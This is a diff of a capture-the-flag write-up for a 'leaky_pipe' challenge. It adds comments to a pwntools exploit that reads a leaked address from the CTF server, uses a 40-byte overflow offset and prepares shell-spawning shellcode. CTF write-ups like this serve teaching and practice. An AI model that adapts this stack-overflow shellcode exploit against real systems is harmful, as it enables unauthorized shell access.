@@ -95,8 +95,10 @@ First we need to calculate the offset that is 32 bytes + 8 bytes to overflow the
 This is the exploit that I create 
 ```python
 # https://ctf.0xl4ugh.com/
+# Import pwntools
 from pwn import *
 
+# Establish the target process
 elf = ELF("leaky_pipe")
 r = remote("ctf.0xl4ugh.com", 4141)
 offset = 40
@@ -105,6 +107,7 @@ leak = int(r.recvline().strip(), 16)
 print(hex(leak))
 # Prepare the shellcode
 shellcode = asm(shellcraft.sh())
+# Make the payload
 payload = b""
 # This shellcode is originally from: http://shell-storm.org/shellcode/files/shellcode-603.php
 # This shellcode will pop a shell when we run it
